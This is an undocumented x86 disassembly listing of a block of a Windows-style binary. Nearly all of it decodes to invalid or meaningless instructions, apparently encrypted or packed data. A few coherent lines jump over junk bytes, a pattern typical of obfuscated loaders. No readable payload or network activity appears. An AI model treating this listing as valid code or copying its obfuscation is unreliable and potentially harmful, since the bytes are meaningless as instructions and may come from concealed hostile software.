  405276:	mov    ebp,esp
  405278:	push   ecx
  405279:	jmp    0x4055dc
  40527e:	sahf   
  40527f:	jb     0x40520d
  405281:	push   edx
  405282:	pop    esp
  405283:	jl     0x4052ed
  405285:	jb     0x405286
  405287:	ret    
  405288:	mov    ebx,0x821e0739
  40528d:	loope  0x4052ea
  40528f:	sub    bh,BYTE PTR [esi+0x7e]
  405292:	les    edi,FWORD PTR [ecx+0x7e]
  405295:	jle    0x4052ed
  405297:	ins    DWORD PTR es:[edi],dx
  405298:	scas   eax,DWORD PTR es:[edi]
  405299:	mov    edi,0x8158b10d
  40529e:	mov    edi,0xb0679aa8
  4052a3:	mov    ch,0xc3
  4052a5:	mov    ds:0x87b18b61,al
  4052aa:	mov    dh,0xfd
  4052ac:	neg    al
  4052ae:	inc    ebp
  4052af:	mov    cs,WORD PTR [ecx]
  4052b1:	mov    edi,0x5085cb47
  4052b6:	or     ah,BYTE PTR [edx+0x3feebb76]
  4052bc:	ins    DWORD PTR es:[edi],dx
  4052bd:	arpl   di,sp
  4052bf:	xchg   ebp,eax
  4052c0:	call   0xfa2b0f2a
  4052c5:	jno    0x4052e5
  4052c7:	sahf   
  4052c8:	add    ch,bh
  4052ca:	test   bl,0xb8
  4052cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052ce:	push   ebp
  4052cf:	xor    al,0xa4
  4052d1:	arpl   WORD PTR [esi-0x17649ab7],bx
  4052d7:	and    ch,BYTE PTR [ecx]
  4052d9:	inc    edx
  4052da:	clc    
  4052db:	cmp    al,0x5a
  4052dd:	mov    ds:0xb39a7d62,eax
  4052e2:	mov    ah,0xe5
  4052e4:	rcl    DWORD PTR [ecx-0x2fd4b39b],cl
  4052ea:	pop    esi
  4052eb:	fbstp  TBYTE PTR fs:[ebp+esi*1+0xfa41aad]
  4052f3:	imul   ecx,DWORD PTR [edx+0x5a],0x54
  4052f7:	inc    ecx
  4052f8:	ds jnp 0x405369
  4052fb:	in     eax,0xb
  4052fd:	lods   eax,DWORD PTR ds:[esi]
  4052fe:	aaa    
  4052ff:	and    bh,dl
  405301:	sbb    eax,0x640984ae
  405306:	mov    bl,0x67
  405308:	(bad)  
  405309:	sub    ebp,esi
  40530b:	test   DWORD PTR [ecx+0x1ef57edf],esp
  405311:	mov    esi,0x74018167
  405316:	fstp   DWORD PTR [ebx+esi*8-0x2b]
  40531a:	arpl   WORD PTR [ecx],dx
  40531c:	xchg   BYTE PTR [ebx+0x57bfbb28],al
  405322:	std    
  405323:	add    dh,bl
  405325:	dec    ebx
  405326:	test   cl,cl
  405328:	xchg   esi,eax
  405329:	scas   eax,DWORD PTR es:[edi]
  40532a:	dec    ecx
  40532b:	ror    DWORD PTR [edx+edi*8],cl
  40532e:	ins    BYTE PTR es:[edi],dx
  40532f:	test   ah,al
  405331:	jno    0x4052b9
  405333:	fcomi  st,st(4)
  405335:	stc    
  405336:	jmp    0x8979df1d
  40533b:	mov    cl,0xce
  40533d:	popf   
  40533e:	mov    al,ds:0xbddad002
  405343:	std    
  405344:	inc    eax
  405345:	ret    
  405346:	xchg   ecx,eax
  405347:	int3   
  405348:	jbe    0x40539b
  40534a:	(bad)  
  40534b:	mov    ch,0xe2
  40534d:	mov    esp,0x96fe9091
  405352:	into   
  405353:	daa    
  405354:	jle    0x405302
  405356:	fs mov ch,cl
  405359:	fadd   QWORD PTR [esi]
  40535b:	es pop ecx
  40535d:	je     0x4052f0
  40535f:	push   edx
  405360:	repz cmc 
  405362:	popf   
  405363:	out    0xb0,al
  405365:	inc    edi
  405366:	mov    esp,0xc8af5f70
  40536b:	in     eax,0x83
  40536d:	loopne 0x4053c1
  40536f:	outs   dx,BYTE PTR ds:[esi]
  405370:	fistp  DWORD PTR [ebx+eax*8+0x7cac9327]
  405377:	lahf   
  405378:	and    BYTE PTR [esi],dh
  40537a:	popf   
  40537b:	outs   dx,DWORD PTR ds:[esi]
  40537c:	dec    eax
  40537d:	jns    0x405322
  40537f:	and    ebx,DWORD PTR [esi]
  405381:	and    ebp,DWORD PTR [ebp+0x27]
  405384:	ret    
  405385:	aas    
  405386:	or     dl,BYTE PTR [ebx+0x52]
  405389:	bound  ebp,QWORD PTR [ebx-0x79]
  40538c:	push   esi
  40538d:	push   ss
  40538e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40538f:	inc    eax
  405390:	dec    esi
  405391:	rol    esp,1
  405393:	cwde   
  405394:	(bad)  
  405395:	loope  0x4053fc
  405397:	test   eax,0xc4c7a42f
  40539c:	shl    DWORD PTR [edx],0x3d
  40539f:	mov    ebp,0x75d6c87d
  4053a4:	mov    esp,0xbe755b
  4053a9:	(bad)  
  4053aa:	cmp    cl,dh
  4053ac:	cdq    
  4053ad:	(bad)  
  4053ae:	loopne 0x40540f
  4053b0:	js     0x4053bc
  4053b2:	or     BYTE PTR [ecx+eax*8+0x3519a768],al
  4053b9:	push   esi
  4053ba:	fwait
  4053bb:	cmp    DWORD PTR [edi+0x43],ecx
  4053be:	push   eax
  4053bf:	hlt    
  4053c0:	xchg   ebp,eax
  4053c1:	xor    ch,ch
  4053c3:	fild   QWORD PTR [edx]
  4053c5:	nop
  4053c6:	mov    bh,BYTE PTR [edx]
  4053c8:	sbb    al,0xfc
  4053ca:	in     eax,0x1b
  4053cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053cd:	xchg   ebx,eax
  4053ce:	adc    ebx,ebx
  4053d0:	mov    ecx,0x811b7d02
  4053d5:	repz inc eax
  4053d7:	loopne 0x40535e
  4053d9:	loope  0x4053f7
  4053db:	xor    bh,cl
  4053dd:	xchg   ebx,eax
  4053de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053df:	dec    edi
  4053e0:	(bad)  
  4053e1:	in     al,dx
  4053e2:	push   es
  4053e3:	jbe    0x4053d2
  4053e5:	sub    eax,0x16f28670
  4053ea:	dec    di
  4053ec:	int    0xc4
  4053ee:	not    edi
  4053f0:	les    esi,FWORD PTR [edi-0x6858310c]
  4053f6:	ins    DWORD PTR es:[edi],dx
  4053f7:	xor    al,0x92
  4053f9:	clc    
  4053fa:	cdq    
  4053fb:	jno    0x4053bd
  4053fd:	fcomp  st(3)
  4053ff:	pop    edx
  405400:	add    esi,DWORD PTR [edi-0x783d87f4]
  405406:	sbb    DWORD PTR [eax-0xce1f1c8],edi
  40540c:	sub    edi,DWORD PTR [eax+0x2619cbaf]
  405412:	cmp    bh,BYTE PTR [esp+eax*1+0x19523d1f]
  405419:	mov    cx,WORD PTR fs:[ebp+0xdc4ed1f]
  405421:	shl    cl,0xa1
  405424:	pop    DWORD PTR [edx+0x54]
  405427:	dec    esi
  405428:	in     al,0xa5
  40542a:	int    0x9e
  40542c:	ret    0xa32f
  40542f:	sub    DWORD PTR [edi],edi
  405431:	retf   0x96df
  405434:	retf   
  405435:	inc    edi
  405436:	fisttp DWORD PTR ds:0x526659cd
  40543c:	pop    edi
  40543d:	jo     0x4054b1
  40543f:	dec    ebp
  405440:	(bad)  
  405441:	jb     0x40548d
  405443:	lock adc eax,0x28e417d6
  405449:	aam    0x12
  40544b:	call   0xc028:0x76b1471d
  405452:	xchg   ecx,eax
  405453:	sub    eax,0xb0587e23
  405458:	or     al,0xc5
  40545a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40545b:	out    0xf,al
  40545d:	fs (bad) 
  40545f:	in     eax,0x2b
  405461:	mov    ebp,0x4dc242d3
  405466:	or     edi,DWORD PTR [edi+0x5b7b583c]
  40546c:	out    dx,al
  40546d:	xchg   BYTE PTR [edx],dh
  40546f:	jge    0x4054d5
  405471:	push   ebx
  405472:	or     eax,0xebcb1343
  405477:	mov    BYTE PTR ds:0xf2101922,0x8f
  40547e:	test   eax,0x6d13b5e7
  405483:	push   edx
  405484:	loopne 0x4054a2
  405486:	mov    ah,0xdd
  405488:	test   ch,al
  40548a:	or     DWORD PTR [ebp+0x53],edi
  40548d:	lods   eax,DWORD PTR ds:[esi]
  40548e:	fnsave [ebx]
  405490:	push   edi
  405491:	jecxz  0x4054eb
  405493:	cmp    dl,BYTE PTR [ecx]
  405495:	pop    edi
  405496:	iret   
  405497:	adc    BYTE PTR [esi-0x44],bl
  40549a:	into   
  40549b:	inc    ecx
  40549c:	icebp  
  40549d:	dec    ebp
  40549e:	xor    ah,dl
  4054a0:	imul   edi,DWORD PTR [ecx],0x118cb5d4
  4054a6:	test   DWORD PTR [esp+edi*2-0x53],ebx
  4054aa:	mov    edx,0x320802af
  4054af:	mov    edi,0xf4678fcd
  4054b4:	hlt    
  4054b5:	and    ebp,esi
  4054b7:	and    DWORD PTR [ebp-0x18180cd1],edi
  4054bd:	mov    esi,0x6a4c72d3
  4054c2:	ja     0x4054b9
  4054c4:	ret    
  4054c5:	inc    edx
  4054c6:	push   0x4b
  4054c8:	sbb    BYTE PTR [ebx+0x61],bl
  4054cb:	lahf   
  4054cc:	mov    edx,0xb2b004f5
  4054d1:	scas   eax,DWORD PTR es:[edi]
  4054d2:	mov    edi,0xdf04a6e5
  4054d7:	cmp    DWORD PTR [eax*1+0x5f03ad9f],ebp
  4054de:	adc    DWORD PTR [ecx],esp
  4054e0:	add    ebx,DWORD PTR [eax]
  4054e2:	xchg   ebp,eax
  4054e3:	pushf  
  4054e4:	dec    edx
  4054e5:	add    DWORD PTR [ebx+0x2f1a30f5],esp
  4054eb:	mov    dh,dl
  4054ed:	lods   al,BYTE PTR ds:[esi]
  4054ee:	mov    al,ds:0xf7411c3a
  4054f3:	aaa    
  4054f4:	aaa    
  4054f5:	cli    
  4054f6:	adc    ch,cl
  4054f8:	mov    eax,ds:0xce941e06
  4054fd:	sub    edi,edx
  4054ff:	fnstsw WORD PTR [eax]
  405501:	(bad)  
  405502:	adc    WORD PTR [edx+0x32],0xb
  405507:	jo     0x405559
  405509:	pop    ebx
  40550a:	cmc    
  40550b:	mov    cl,0x87
  40550d:	mov    dh,0x8d
  40550f:	sub    DWORD PTR [esi+0x40678345],ebx
  405515:	mov    esp,0xb71bb035
  40551a:	hlt    
  40551b:	les    esi,FWORD PTR [esi]
  40551d:	add    ch,BYTE PTR [ebp-0x2252fb40]
  405523:	or     eax,0x56597719
  405528:	cwde   
  405529:	(bad)  
  40552a:	mov    dl,0x10
  40552c:	lods   eax,DWORD PTR ds:[esi]
  40552d:	jg     0x4054f2
  40552f:	add    BYTE PTR [esi+0x47b3ac4a],0xda
  405536:	mov    DWORD PTR [ebp-0x2],0x73a811c
  40553d:	and    DWORD PTR [ebx+0x74c9bcfb],edx
  405543:	ins    BYTE PTR es:[edi],dx
  405544:	mov    eax,0x3bd09344
  405549:	ss jns 0x4054ee
  40554c:	sub    dh,BYTE PTR [eax]
  40554e:	inc    esp
  40554f:	loopne 0x4054fc
  405551:	lods   al,BYTE PTR ds:[esi]
  405552:	je     0x40553f
  405554:	jle    0x40556a
  405556:	cmc    
  405557:	jp     0x405587
  405559:	call   0x2e18b475
  40555e:	das    
  40555f:	mov    ecx,0x3f428e09
  405564:	imul   BYTE PTR [edx+0x41f0e8eb]
  40556a:	les    ebp,FWORD PTR [ebx-0x32]
  40556d:	sub    al,0xd0
  40556f:	(bad)  
  405571:	out    0xdb,eax
  405573:	xchg   ecx,eax
  405574:	add    DWORD PTR [edi+0x33],ebp
  405577:	pop    esi
  405578:	jmp    0x816c:0xfae86b8f
  40557f:	repnz clc 
  405581:	cli    
  405582:	es (bad) 
  405584:	jg     0x4055ca
  405586:	in     eax,dx
  405587:	fbld   TBYTE PTR [eax+esi*4+0x1]
  40558b:	and    al,0xa0
  40558d:	push   ebp
  40558e:	loop   0x405550
  405590:	add    DWORD PTR [eax-0x44e7c470],0xffffffde
  405597:	push   esi
  405598:	jnp    0x40551c
  40559a:	dec    edx
  40559b:	mov    edx,0x9e3d9c5b
  4055a0:	add    DWORD PTR [edi+esi*8+0x8],esi
  4055a4:	sub    BYTE PTR [edx],dl
  4055a6:	add    eax,0x1047e6e0
  4055ab:	lods   eax,DWORD PTR ds:[esi]
  4055ac:	sar    DWORD PTR [ebx],cl
  4055ae:	mov    cl,0x2c
  4055b0:	jne    0x40557b
  4055b2:	adc    dl,cl
  4055b4:	xlat   BYTE PTR ds:[ebx]
  4055b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055b6:	or     BYTE PTR [esi-0x7822400c],dh
  4055bc:	dec    esp
  4055bd:	push   esi
  4055be:	jb     0x405625
  4055c0:	dec    edi
  4055c1:	iret   
  4055c2:	je     0x40557d
  4055c4:	test   DWORD PTR [ebp+0x15],0x9d498586
  4055cb:	mov    ebp,0x7d9758af
  4055d0:	stos   BYTE PTR es:[edi],al
  4055d1:	mov    eax,ds:0x6e5190b6
  4055d6:	test   esp,0xf1513f4c
  4055dc:	push   ecx
  4055dd:	mov    eax,0x5a3fc9f
  4055e2:	mov    DWORD PTR [ebp-0x4],eax
  4055e5:	mov    DWORD PTR ds:0x4345f3,0x3619
  4055ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4055f2:	jmp    0x405955
  4055f7:	xchg   esi,eax
  4055f8:	jb     0x405627
  4055fa:	jg     0x4055e9
  4055fc:	dec    ecx
  4055fd:	mov    esp,0x8b1aac73
  405602:	cs ffree st(5)
  405605:	mov    esi,0x7e3621b7
  40560a:	jle    0x4055d0
  40560c:	jns    0x40568c
  40560e:	jle    0x405618
  405610:	test   BYTE PTR [eax+eiz*2-0x1356cbfc],ah
  405617:	sub    BYTE PTR [esi-0x63cbab7f],bl
  40561d:	out    0xde,al
  40561f:	dec    ebp
  405620:	push   ecx
  405621:	mov    edi,0xdad633ba
  405626:	xchg   edx,eax
  405627:	or     al,0x4c
  405629:	xlat   BYTE PTR ds:[ebx]
  40562a:	push   edx
  40562b:	and    DWORD PTR [ebx],edi
  40562d:	das    
  40562e:	cmp    dh,ah
  405630:	(bad)  
  405631:	dec    BYTE PTR [esi-0x4c4671ca]
  405637:	or     BYTE PTR [eax],bl
  405639:	mov    esi,0x5d7fdf3b
  40563e:	jle    0x4056af
  405640:	repz xor DWORD PTR [eax],ecx
  405643:	adc    DWORD PTR [esi+0x38],ecx
  405646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405647:	repz dec ebx
  405649:	jbe    0x405637
  40564b:	es cmove ecx,ebx
  40564f:	xchg   BYTE PTR [edi],dh
  405651:	das    
  405652:	in     al,0x1c
  405654:	pop    esi
  405655:	in     al,dx
  405656:	sbb    BYTE PTR [edi-0x57],bh
  405659:	xchg   BYTE PTR [esi],ch
  40565b:	stos   BYTE PTR es:[edi],al
  40565c:	ins    BYTE PTR es:[edi],dx
  40565d:	jmp    0x4056c0
  40565f:	pop    ss
  405660:	jno    0x4055ed
  405662:	or     eax,0x1725ece1
  405667:	stc    
  405668:	xchg   ebx,eax
  405669:	outs   dx,DWORD PTR ds:[esi]
  40566a:	stos   BYTE PTR es:[edi],al
  40566b:	xchg   ecx,eax
  40566c:	xchg   DWORD PTR [edx],esp
  40566e:	sub    bl,cl
  405670:	std    
  405671:	in     eax,dx
  405672:	xlat   BYTE PTR ds:[ebx]
  405673:	jb     0x40560c
  405675:	sub    eax,0x856011a
  40567a:	mov    WORD PTR [eax-0x24e798b2],gs
  405680:	jge    0x40568d
  405682:	hlt    
  405683:	inc    ebx
  405684:	in     eax,0xab
  405686:	pusha  
  405687:	sar    DWORD PTR [esi+esi*2+0x6f],cl
  40568b:	call   0x64be88da
  405690:	mov    BYTE PTR [ecx-0x78],0x5f
  405694:	sbb    ecx,ecx
  405696:	dec    ebx
  405697:	and    al,0x29
  405699:	cmp    al,0x4e
  40569b:	outs   dx,DWORD PTR ds:[esi]
  40569c:	pop    edx
  40569d:	push   0x34
  40569f:	mov    ebx,0x7572bd33
  4056a4:	mov    dh,0xbe
  4056a6:	pop    eax
  4056a7:	test   ch,al
  4056a9:	loopne 0x40567b
  4056ab:	xchg   DWORD PTR [ecx+0x23],edx
  4056ae:	push   edx
  4056af:	push   eax
  4056b0:	test   BYTE PTR [ebp+0x5d70171],ch
  4056b6:	in     eax,dx
  4056b7:	pop    edi
  4056b8:	xchg   esi,eax
  4056b9:	and    DWORD PTR [ebp-0x2dcc3d6e],ebx
  4056bf:	xchg   ebp,eax
  4056c0:	add    al,0xd7
  4056c2:	push   ebx
  4056c3:	jecxz  0x405707
  4056c5:	aad    0x45
  4056c7:	out    dx,eax
  4056c8:	cdq    
  4056c9:	pusha  
  4056ca:	into   
  4056cb:	retf   
  4056cc:	xor    BYTE PTR [ebx],bl
  4056ce:	ror    DWORD PTR fs:[ebx-0x5f],0x74
  4056d3:	aad    0x24
  4056d5:	sub    BYTE PTR [edx],dh
  4056d7:	cli    
  4056d8:	xor    eax,0x4c61192e
  4056dd:	or     al,0x17
  4056df:	push   ebx
  4056e0:	pop    ebx
  4056e1:	and    ah,BYTE PTR ds:0x7d313005
  4056e7:	add    ah,BYTE PTR [ecx]
  4056e9:	push   edi
  4056ea:	clc    
  4056eb:	xchg   BYTE PTR [ebp-0x14e175b4],cl
  4056f1:	sbb    BYTE PTR [ecx],bl
  4056f3:	jle    0x40574e
  4056f5:	sbb    eax,0xe2fffd8b
  4056fa:	inc    edi
  4056fb:	out    0x9f,eax
  4056fd:	xchg   DWORD PTR ds:0x47247962,eax
  405703:	addr16 fmul st(0),st
  405706:	mov    ebx,0xca1af6d4
  40570b:	gs aam 0x89
  40570e:	pop    ecx
  40570f:	pop    edx
  405710:	xor    eax,0x809379d0
  405715:	mov    al,ds:0xb68b6a76
  40571a:	add    eax,DWORD PTR [ebx+0x1ac502a]
  405720:	mov    bl,0x24
  405722:	and    BYTE PTR [ebx-0x34],0x8c
  405726:	xor    dh,BYTE PTR [ebp+0x6a8b7309]
  40572c:	aaa    
  40572d:	xchg   ebp,eax
  40572e:	xor    al,0x85
  405730:	add    DWORD PTR [eax-0x6a],0x0
  405734:	test   BYTE PTR [edi],ch
  405736:	bound  edx,QWORD PTR [edx]
  405738:	pop    es
  405739:	xchg   esp,eax
  40573a:	ficomp DWORD PTR [esi+0x632b5404]
  405740:	push   eax
  405741:	mov    al,0x71
  405743:	ror    BYTE PTR [edx-0x11a71fef],0xfe
  40574a:	mov    dl,0x5e
  40574c:	mov    esi,0x6dbcf113
  405751:	or     al,0x31
  405753:	mov    WORD PTR [edi+ebp*8],ss
  405756:	addr16 sbb eax,0x57acac35
  40575c:	punpckhbw mm7,mm1
  40575f:	stos   DWORD PTR es:[edi],eax
  405760:	push   ss
  405761:	dec    esi
  405762:	pop    ecx
  405763:	out    dx,al
  405764:	shr    DWORD PTR [edi-0x13d795d],1
  40576a:	loopne 0x40572e
  40576c:	mov    al,0xee
  40576e:	and    al,0x66
  405770:	cmp    bl,BYTE PTR [edi+0x2]
  405773:	push   esi
  405774:	fnstcw WORD PTR [esi]
  405776:	pushf  
  405777:	lea    edi,[eax-0x2c9fc86c]
  40577d:	mov    dh,0x0
  40577f:	out    0x96,al
  405781:	inc    ebp
  405782:	ja     0x4057fe
  405784:	ret    
  405785:	xchg   ebp,eax
  405786:	aas    
  405787:	lock pop eax
  405789:	int    0x7d
  40578b:	cmp    al,0x22
  40578d:	repz mov eax,0x24d07316
  405793:	idiv   BYTE PTR [esi+0x217abe76]
  405799:	pop    ds
  40579a:	popf   
  40579b:	xor    ecx,DWORD PTR [edx]
  40579d:	mov    bl,0xb2
  40579f:	cld    
  4057a0:	and    esi,esp
  4057a2:	in     eax,0x97
  4057a4:	dec    ebx
  4057a5:	push   ss
  4057a6:	mov    cl,0xb3
  4057a8:	push   0x2bbc9470
  4057ad:	mov    dl,BYTE PTR [ecx]
  4057af:	out    0x1,al
  4057b1:	stos   BYTE PTR es:[edi],al
  4057b2:	loope  0x405773
  4057b4:	mov    bh,0x49
  4057b6:	jmp    0x30d70ccf
  4057bb:	xor    eax,0x3e0d55fa
  4057c0:	ins    DWORD PTR es:[edi],dx
  4057c1:	sub    BYTE PTR [ebx+ebx*1],dh
  4057c4:	cmp    BYTE PTR [ebx],dl
  4057c6:	mov    dh,0x73
  4057c8:	sbb    al,0xdb
  4057ca:	neg    DWORD PTR [edi-0x2d]
  4057cd:	jmp    0xb541:0x90c095cb
  4057d4:	stos   DWORD PTR es:[edi],eax
  4057d5:	ror    BYTE PTR [edi],cl
  4057d7:	inc    ebx
  4057d8:	mov    esi,0x5f7dd0a8
  4057dd:	popf   
  4057de:	push   0x6a
  4057e0:	sbb    bl,BYTE PTR es:[eax]
  4057e3:	in     al,dx
  4057e4:	jb     0x40577c
  4057e6:	ret    0xfe25
  4057e9:	pop    esp
  4057ea:	int3   
  4057eb:	dec    edi
  4057ec:	jecxz  0x4057d5
  4057ee:	scas   eax,DWORD PTR es:[edi]
  4057ef:	call   0x9e1f:0xe290ced3
  4057f6:	fisttp QWORD PTR [eax]
  4057f8:	rol    BYTE PTR [eax+ebp*4-0x5a],0xcc
  4057fd:	scas   al,BYTE PTR es:[edi]
  4057fe:	rol    esi,0xf
  405801:	in     al,0x29
  405803:	rcl    BYTE PTR [eax-0x1c],cl
  405806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405807:	in     al,0xed
  405809:	aas    
  40580a:	test   al,0x28
  40580c:	cmp    BYTE PTR [eax+eiz*1+0x5],al
  405810:	test   eax,0x1d5f3424
  405815:	xchg   esi,eax
  405816:	lds    eax,FWORD PTR [ebx+0x5a94bb98]
  40581c:	data16 mov WORD PTR gs:[eax-0x59],?
  405821:	sub    dl,BYTE PTR [edx+ebp*8+0x759d1ebf]
  405828:	dec    esi
  405829:	(bad)  
  40582a:	iret   
  40582b:	pusha  
  40582c:	stos   DWORD PTR es:[edi],eax
  40582d:	(bad)  
  40582e:	call   FWORD PTR [ecx+0x21cbc7fe]
  405834:	mov    eax,0x97957a53
  405839:	cdq    
  40583a:	ss (bad) 
  40583c:	jl     0x405881
  40583e:	cmp    DWORD PTR [ebp-0x6507baba],esp
  405844:	mov    dl,0x39
  405846:	adc    esp,DWORD PTR [edi+0x24db7830]
  40584c:	scas   al,BYTE PTR es:[edi]
  40584d:	das    
  40584e:	mov    al,0x96
  405850:	push   ecx
  405851:	outs   dx,DWORD PTR ds:[esi]
  405852:	jecxz  0x4058b9
  405854:	jo     0x4058d2
  405856:	mov    eax,0x64276e06
  40585b:	and    DWORD PTR [edi],0xffffffc7
  40585e:	dec    eax
  40585f:	jmp    0x9d1d64f1
  405864:	pop    ebx
  405865:	and    al,0xcc
  405867:	mov    bh,0x44
  405869:	add    al,0xae
  40586b:	or     dl,BYTE PTR [edx+ebx*4+0x39]
  40586f:	cmp    BYTE PTR [eax-0x4d691823],bl
  405875:	or     DWORD PTR [ecx-0x6a],ebx
  405878:	iret   
  405879:	scas   eax,DWORD PTR es:[edi]
  40587a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40587b:	xor    edx,esi
  40587d:	scas   al,BYTE PTR es:[edi]
  40587e:	lods   eax,DWORD PTR ds:[esi]
  40587f:	enter  0x3883,0x68
  405883:	mov    edx,0xe835c41
  405888:	int    0x64
  40588a:	in     eax,dx
  40588b:	dec    edx
  40588c:	clc    
  40588d:	cmp    DWORD PTR [ecx-0x5960bae7],eax
  405893:	add    edx,edi
  405895:	and    esp,DWORD PTR [ebp-0x36f76c44]
  40589b:	(bad)  
  40589c:	mov    esp,eax
  40589e:	imul   ebx,DWORD PTR [eax+0x6bfe4001],0xfb453adb
  4058a8:	dec    BYTE PTR [ecx*1+0x10a27ebd]
  4058af:	dec    ecx
  4058b0:	ror    DWORD PTR ds:0xbe64433a,1
  4058b6:	repnz (bad) 
  4058b9:	and    eax,0xaf1eb1d6
  4058be:	imul   ecx,DWORD PTR [ebp+0xc],0xfffffff1
  4058c2:	push   ss
  4058c3:	test   eax,0x9c26e1e7
  4058c8:	sbb    al,0xe0
  4058ca:	sbb    eax,0x39fd75c4
  4058cf:	test   al,0xa3
  4058d1:	fisttp QWORD PTR [edx-0x6ac5cde3]
  4058d7:	ss mov ebx,0x91d24a35
  4058dd:	aad    0xb1
  4058df:	xor    BYTE PTR [esi+0x4],0xe8
  4058e3:	mov    al,ds:0xd6f5ace5
  4058e8:	sub    BYTE PTR [ecx+0x78],bh
  4058eb:	test   BYTE PTR [ebx+0x37b246ce],cl
  4058f1:	in     al,0x48
  4058f3:	jl     0x405972
  4058f5:	add    eax,0x6c5c71bb
  4058fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058fb:	test   al,0x4d
  4058fd:	sub    DWORD PTR [esi],esp
  4058ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405900:	mov    cl,0x66
  405902:	dec    edx
  405903:	out    dx,al
  405904:	(bad)  
  405905:	rcr    BYTE PTR [ebx],0xb5
  405908:	inc    edi
  405909:	adc    esp,eax
  40590b:	popf   
  40590c:	jne    0x40596b
  40590e:	fidiv  DWORD PTR [eax]
  405910:	dec    ebx
  405911:	pop    esp
  405912:	adc    al,0x67
  405914:	and    dh,BYTE PTR [ebp+ecx*8-0x38d3461a]
  40591b:	and    ah,BYTE PTR [esi]
  40591d:	rcl    ecx,1
  40591f:	clc    
  405920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405921:	je     0x4058e0
  405923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405924:	cmp    eax,0x8fd4864
  405929:	and    ch,BYTE PTR [edi-0x797290cc]
  40592f:	cmp    ch,al
  405931:	xchg   ebx,eax
  405932:	iret   
  405933:	dec    ebx
  405934:	mov    ds:0xb5ff0a4c,al
  405939:	ins    BYTE PTR es:[edi],dx
  40593a:	jmp    0x988b:0xcc1a2d47
  405941:	sbb    al,0x2
  405943:	push   edx
  405944:	or     DWORD PTR [ebp-0x1ace8df4],esp
  40594a:	and    DWORD PTR [ebx-0x34119a6f],ebp
  405950:	mov    BYTE PTR [ebx],bl
  405952:	in     al,0xf8
  405954:	or     edi,eax
  405956:	inc    ebp
  405957:	clc    
  405958:	cmp    DWORD PTR [edi+0x0],ecx
  40595b:	add    bh,al
  40595d:	add    eax,0x4346d3
  405962:	dec    edx
  405963:	and    al,BYTE PTR [eax]
  405965:	add    cl,ch
  405967:	pop    esi
  405968:	add    eax,DWORD PTR [eax]
  40596a:	add    BYTE PTR [edx+0x71b8a1ab],bh
  405970:	pop    esp
  405971:	arpl   WORD PTR [ebp-0x4d872e44],si
  405977:	xchg   ebp,eax
  405978:	pop    esi
  405979:	sbb    ebp,edi
  40597b:	out    dx,eax
  40597c:	xor    DWORD PTR [esi+0x7e],edi
  40597f:	les    edi,FWORD PTR [ecx+0x7e]
  405982:	jle    0x40597b
  405984:	mov    ds:0xd7d7d2d6,al
  405989:	into   
  40598a:	shr    DWORD PTR [eax+0x4b],cl
  40598d:	js     0x405922
  40598f:	mov    ah,0xdf
  405991:	ret    
  405992:	xchg   ebx,eax
  405993:	stos   WORD PTR es:[edi],ax
  405995:	imul   DWORD PTR [edx-0x32426306]
  40599b:	nop
  40599c:	out    dx,al
  40599d:	ins    BYTE PTR es:[edi],dx
  40599e:	test   eax,0xd6eadc55
  4059a3:	sub    al,0xda
  4059a5:	fwait
  4059a6:	mov    ?,WORD PTR [ebx-0xb533e78]
  4059ac:	(bad)  
  4059ad:	aas    
  4059ae:	aad    0x18
  4059b0:	mov    ds:0x68d53219,eax
  4059b5:	mov    bl,0x87
  4059b7:	sbb    edi,edi
  4059b9:	stos   BYTE PTR es:[edi],al
  4059ba:	retf   0xfbae
  4059bd:	sub    BYTE PTR [ebx],bl
  4059bf:	push   0xce7d0f42
  4059c4:	jle    0x4059ee
  4059c6:	or     bl,BYTE PTR [esi*1-0x46059cae]
  4059cd:	dec    edx
  4059ce:	ror    edi,cl
  4059d0:	xchg   edi,eax
  4059d1:	jnp    0x4059ad
  4059d3:	push   ss
  4059d4:	sbb    al,0x1
  4059d6:	adc    DWORD PTR [eax],eax
  4059d8:	xor    eax,0xbfd35fe
  4059dd:	pusha  
  4059de:	fs stos BYTE PTR es:[edi],al
  4059e0:	xor    al,BYTE PTR [ebp+0x3a5bc03f]
  4059e6:	xor    eax,0x1e428293
  4059eb:	dec    ecx
  4059ec:	xchg   BYTE PTR [ebx],bl
  4059ee:	xor    DWORD PTR [ecx+0x78],edi
  4059f1:	mov    WORD PTR [edi+ecx*4],es
  4059f4:	das    
  4059f5:	data16 daa 
  4059f7:	xor    BYTE PTR [edx],ah
  4059f9:	xor    esi,ebx
  4059fb:	sub    cl,ch
  4059fd:	mov    ds:0x34d37152,eax
  405a02:	sub    dl,BYTE PTR [ebp+0x7ad8601b]
  405a08:	je     0x4059ae
  405a0a:	hlt    
  405a0b:	push   esp
  405a0c:	add    DWORD PTR [edx],ebx
  405a0e:	jb     0x405a7c
  405a10:	dec    ecx
  405a11:	out    dx,eax
  405a12:	(bad)  
  405a13:	pop    ds
  405a14:	je     0x405a3f
  405a16:	fistp  QWORD PTR [ebx+0x78734e73]
  405a1c:	inc    ebx
  405a1d:	mov    dh,0x55
  405a1f:	loop   0x405a1f
  405a21:	mov    bl,0x5e
  405a23:	fs push edx
  405a25:	(bad)  
  405a26:	fidiv  WORD PTR [ebx]
  405a28:	les    edi,FWORD PTR [ebx]
  405a2a:	push   esi
  405a2b:	push   edx
  405a2c:	mov    bh,0x28
  405a2e:	push   ecx
  405a2f:	mov    eax,ds:0xc3970c0d
  405a34:	dec    esi
  405a35:	in     eax,0x13
  405a37:	test   dl,cl
  405a39:	fcomp  QWORD PTR [ebp+0x37]
  405a3c:	adc    bh,BYTE PTR [ecx]
  405a3e:	test   BYTE PTR [eax-0x68],bh
  405a41:	clc    
  405a42:	and    al,0xcf
  405a44:	std    
